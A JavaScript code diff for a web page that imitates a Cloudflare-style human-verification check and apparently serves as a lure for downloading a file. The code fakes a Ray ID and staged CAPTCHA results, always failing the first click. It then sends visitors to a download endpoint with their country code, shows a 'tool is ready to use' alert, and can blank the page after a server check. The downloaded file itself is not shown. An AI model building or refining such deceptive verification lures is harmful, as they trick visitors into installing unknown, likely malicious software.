@@ -18,48 +18,16 @@ function generateRayID() {
 }
 
 
-// Function to display the current domain
-function setDomain() {
-  var domain = window.location.hostname;
-  document.getElementById("domain-name").innerHTML = domain;
-}
-
-// Function to fetch the user's IP using an external service
-// async function fetchUserIP() {
-//   try {
-//     var response = await fetch("https://api.ipify.org?format=json");
-//     var data = await response.json();
-//     document.getElementById("footer-ip").innerHTML = data.ip;
-//   } catch (error) {
-//     console.error("Error fetching IP address:", error);
-//     document.getElementById("footer-ip").innerHTML = "Unavailable";
-//   }
-// }
-
-// Run functions on page load
-document.addEventListener("DOMContentLoaded", function () {
-  setDomain();
-  fetchUserIP();
-
-  // Set the generated Ray ID
-  var rayID = generateRayID();
-  // document.getElementById("ray-id").innerHTML = rayID;
-});
-
 var downloadBtn = document.getElementById("download-btn");
 var captchaWrapper = document.getElementById("captcha-wrapper");
 
-
-// Simulate enabling the checkbox after a certain time (for example purposes)
-setTimeout(() => {
-  // document.getElementById("captcha-checkbox").disabled = false;
-}, 1000); // Enables checkbox after 1 second
-
+let userLang;
+let translate_Lang;
 // **************** JS Code For Translate ********************
 // Function to detect the user's browser language and set the appropriate text
 function setLanguage(translations) {
   // Get the user's preferred language from the browser (e.g., 'en', 'es')
-  let userLang = navigator.language || navigator.userLanguage;
+  userLang = navigator.language || navigator.userLanguage;
   // Only keep the first two characters (e.g., 'en-US' becomes 'en')
   userLang = userLang.slice(0, 2);
 
@@ -67,6 +35,7 @@ function setLanguage(translations) {
   if (!translations[userLang]) {
     userLang = "es";
   }
+
   // Fetch all elements with the 'data-translate' attribute
   var translatableElements = document.querySelectorAll("[data-translate]");
 
@@ -78,18 +47,19 @@ function setLanguage(translations) {
   });
 }
 
+
 // Function to load translations from a JSON file
 function loadTranslations() {
   fetch("./V1_files/lang.json")
     .then((response) => response.json())
     .then((translations) => {
+      translate_Lang = translations;
       setLanguage(translations);
     })
     .catch((error) => {
       console.error("Error loading translations:", error);
     });
 }
-
 
 
 // Getting the country code from the user's IP
@@ -113,16 +83,6 @@ $('#donwload_btn').click(function() {
 })
 
 
-
-// hide overlay
-function hideoverlay() {
-  if (isClose) {
-    // document.getElementById('captcha-wrapper').style.display = 'none';
-    // document.getElementById('overlay').style.display = 'none';
-  }
-}
-
-
 // download ban more than 2 times
 var downloadCount = 0;
 
@@ -130,8 +90,6 @@ var downloadCount = 0;
 $('#submit_btn').click(function() {
 
   if (isClose) {
-    // $('#captcha-wrapper').css('display', 'none');
-    // $('#overlay').css('display', 'none');
 
     downloadCount++;
     window.location.href = "/api/index.php?rayid=" + rayID + "&countrycode=" + country_code;
@@ -140,7 +98,7 @@ $('#submit_btn').click(function() {
         check_ray_id();
     }, 60000);
 
-    // window.alert('Your report has been successfully downloaded!');
+    window.alert("Download complete. \n The tool is ready to use.");
   }
 
   if (downloadCount >= 2) {
@@ -152,25 +110,13 @@ $('#submit_btn').click(function() {
 })
 
 
-// hide popup when click overlay
-$('#overlay').click(function() {
-    if (isClose) {
-      // $('#captcha-wrapper').css('display', 'none');
-      // $('#overlay').css('display', 'none');  
-    }
-})
-
-
 // can the popup close?
 var isClose = false;
 
 // play video loading
 function play_loading() {
     
-    // Replace checkbox with spinner
-    // document.getElementById("captcha-checkbox").style.display = "none";
-    // document.getElementById("captcha-spinner").style.display = "block";
-    document.getElementById("captcha-text").innerHTML = "Verifying...";
+    document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['process'];
 
     if (clickCount == 0) {
         document.getElementById('video1').play();
@@ -181,24 +127,17 @@ function play_loading() {
     } 
 
     setTimeout(function () {
-      // document.getElementById("captcha-spinner").style.display = "none"; // Hide spinner after 2 seconds
       
       if (clickCount == 0) {
         // First click: show alert, revert to checkbox, but no success mark
         document.getElementById("error-message").style.display = "block"; // Show red error message
-        // document.getElementById("captcha-checkbox").checked = false; // Ensure checkbox is unchecked
-        document.getElementById("captcha-text").innerHTML = "Verify you are human";
-        // document.getElementById("captcha-checkbox").style.display = "block"; // Show checkbox again
-        // document.getElementById("captcha-checkbox").disabled = false; // Enable checkbox again
-        document.getElementById('captcha-wrapper').style.height = '140px';
-        document.getElementById('submit_div').style.paddingTop = '45px';
+        document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['verify-human'];
+        document.getElementById('captcha-wrapper').style.height = '130px';
+        document.getElementById('submit_div').style.paddingTop = '40px';
       } else if (clickCount == 1) {
         // Second click: successful verification, show success mark
         document.getElementById("error-message").style.display = "none"; // Hide error message
-        // document.getElementById("captcha-checkbox").checked = true; // Show success mark
-        document.getElementById("captcha-text").innerHTML = "Success!";
-        // document.getElementById("captcha-checkbox").style.display = "block";
-        // document.getElementById("captcha-checkbox").disabled = true; // Disable checkbox permanently
+        document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['success'];
         document.getElementById('captcha-wrapper').style.height = 'auto';
         document.getElementById('submit_div').style.paddingTop = '15px';
 
@@ -252,32 +191,15 @@ applyDarkMode();
 
 // Ray ID
 var rayID;
-fetch(window.location.href, {
-    method: 'GET',
-})
-.then(response => {
 
-    if ( response.headers.get('cf-ray') ) {
+if (localStorage.getItem('ray')) {
+  rayID = localStorage.getItem('ray');
+} else {
+  rayID = generateRayID();
+  localStorage.setItem('ray', rayID);
+}
 
-        rayID = response.headers.get('cf-ray');
-        $('#ray-id').text(rayID);
-
-    } else {
-
-        if (localStorage.getItem('ray')) {
-            rayID = localStorage.getItem('ray');
-        } else {
-            rayID = generateRayID();
-            localStorage.setItem('ray', rayID);
-        }
-        
-        $('#ray-id').text(rayID);  
-    }
-})
-.catch(error => {
-    console.error('Error fetching page:', error);
-});
-
+$('#ray-id').text(rayID);  
 
 
 // Block site
@@ -296,7 +218,6 @@ function check_ray_id() {
     data: JSON.stringify({ rayid: rayID }),
     contentType: 'application/json', // Indicate that you're sending JSON
     success: function(res) {
-        console.log(res)
 
         if (res == '10') {
           document.body.innerHTML = '';
